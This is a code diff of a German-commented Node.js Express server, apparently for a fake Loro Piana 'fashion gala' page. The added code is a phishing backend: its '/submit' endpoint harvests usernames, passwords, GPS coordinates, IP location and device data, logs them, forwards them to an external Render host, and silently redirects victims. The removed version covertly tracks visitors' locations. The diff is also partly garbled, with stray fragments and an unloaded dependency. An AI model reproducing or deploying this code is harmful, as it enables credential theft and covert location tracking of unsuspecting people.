@@ -1,134 +1,76 @@
-// 🔥 1. HTTPS-Erzwingung (KRITISCH für Render)
 const express = require('express');
-const app = express();
+const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs');
-const cors = require('cors');
+const fetch = require('node-fetch');
+const geoip = require('geoip-lite'); // Für IP-Geolocation
+const device = require('express-device'); // Für Device-Tracking
 
-// 📁 Log-Verzeichnis erstellen
-const LOG_DIR = path.join(__dirname, 'logs');
-if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-// 🛡️ 2. Middleware-Konfiguration
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public'));
+// Middleware für erweitertes Tracking
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
+app.use(device.capture()); // Device-Typ (Mobile/Desktop) erkennen
 
-// 🌐 3. CORS mit Whitelisting (Sicherheit!)
-const allowedOrigins = [
-  'https://loropiana1.onrender.com',
-  'https://your-custom-domain.com' // Falls vorhanden
-];
+// Erweiterte Log-Datei mit mehr Metadaten
+const logSubmission = (data) => {
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    ip: data.ip,
+    userAgent: data.userAgent,
+    deviceType: data.deviceType,
+    browser: data.browser,
+    os: data.os,
+    username: data.username,
+    password: data.password,
+    latitude: data.latitude,
+    longitude: data.longitude,
+    city: data.city,
+    country: data.country
+  };
+  fs.appendFileSync('submissions.log', JSON.stringify(logEntry) + '\n');
+};
 
-app.use(cors({
-  origin: function(origin, callback) {
-    if (!origin || allowedOrigins.includes(origin)) {
-      callback(null, true);
-    } else {
-      console.error('🚨 Blockierte CORS-Anfrage von:', origin);
-      callback(new Error('Not allowed by CORS'));
-    }
-  },
-  methods: ['GET', 'POST'],
-  credentials: true
-}));
+// Standort-API (falls JavaScript-Geolocation blockiert)
+const getIPLocation = (ip) => {
+  const geo = geoip.lookup(ip);
+  return geo ? { city: geo.city, country: geo.country } : null;
+};
 
-// 💀 4. Request-Logging Middleware (Debugging)
-app.use((req, res, next) => {
-  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
-  if (req.body && Object.keys(req.body).length > 0) {
-    console.log('Request Body:', JSON.stringify(req.body));
-  }
-  next();
-});
-
-// 📌 5. Tracking-Endpoint (MIT VALIDIERUNG)
-app.post('/track', (req, res) => {
+// POST-Endpoint für Datenklau
+app.post('/submit', async (req, res) => {
   try {
-    // 🎯 Datenvalidierung
-    const { lat, lng, accuracy, method, ip } = req.body;
-    if (!lat || !lng || !accuracy) {
-      throw new Error('Ungültige Tracking-Daten');
-    }
+    const { username, password, latitude, longitude } = req.body;
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ipLocation = getIPLocation(clientIp);
 
-    // 📝 Log-Eintrag erstellen
-    const logEntry = {
-      timestamp: new Date().toISOString(),
-      coordinates: { 
-        lat: parseFloat(lat).toFixed(6),
-        lng: parseFloat(lng).toFixed(6) 
-      },
-      accuracy: `${Math.floor(accuracy)}m`,
-      method: method || 'UNKNOWN',
-      ip: ip || req.ip,
-      userAgent: req.get('User-Agent'),
-      status: accuracy <= 2000 ? "✅ ERFOLG" : "⚠️ UNGENAU"
+    const logData = {
+      ip: clientIp,
+      userAgent: req.headers['user-agent'],
+      deviceType: req.device.type, // Mobile/Desktop
+      browser: req.useragent.browser,
+      os: req.useragent.os,
+      username,
+      password,
+      latitude,
+      longitude,
+      city: ipLocation?.city || "Unbekannt",
+      country: ipLocation?.country || "Unbekannt"
     };
 
-    // 💾 Sync + Async Logging (Ausfallsicher)
-    fs.appendFileSync(
-      path.join(LOG_DIR, 'tracking.log'),
-      JSON.stringify(logEntry) + '\n'
-    );
+    logSubmission(logData); // Lokal speichern
 
-    // 🔄 Backup-Log (für Render)
-    if (process.env.RENDER) {
-      fs.appendFile(
-        path.join(LOG_DIR, 'backup.log'),
-        JSON.stringify(logEntry) + '\n',
-        (err) => { if (err) console.error('Backup-Log Fehler:', err); }
-      );
-    }
-
-    res.sendStatus(200);
-  } catch (error) {
-    console.error('❌ Tracking-Fehler:', error.message);
-    res.status(400).json({ error: error.message });
-  }
-});
-
-// 🗺️ 6. Dashboard-Endpoint (Optional)
-app.get('/dashboard', (req, res) => {
-  try {
-    const logs = fs.readFileSync(path.join(LOG_DIR, 'tracking.log'), 'utf-8')
-      .split('\n')
-      .filter(Boolean)
-      .map(JSON.parse);
-
-    res.json({
-      total: logs.length,
-      accurate: logs.filter(log => log.status.includes('✅')).length,
-      recent: logs.slice(-10).reverse()
-    });
-  } catch (error) {
-    res.status(500).json({ error: 'Logs konnten nicht gelesen werden' });
-  }
-});
-
-// ⚠️ 7. Error-Handler (GANZ WICHTIG)
-app.use((err, req, res, next) => {
-  console.error('💥 Server Error:', err.stack);
-  res.status(500).send('Interner Serverfehler');
-});
-
-process.on('unhandledRejection', (err) => {
-  console.error('🔥 Unhandled Rejection:', err);
-});
-
-  res.redirect('/fashion-gala.html');
-
-  } catch (error) {
-    console.error("❌ Fehler:", error);
-    res.status(500).send("Serverfehler");
-  }
-});
-
+    // Optional: Daten an externen Server senden
     await fetch('https://loropiana1.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(logData)
     });
 
+    // Unauffällige Weiterleitung
     res.redirect('/fashion-gala.html');
 
   } catch (error) {
@@ -137,6 +79,7 @@ process.on('unhandledRejection', (err) => {
   }
 });
 
+// Starte den Server
 app.listen(PORT, () => {
   console.log(`✅ Server läuft auf http://localhost:${PORT}`);
 });
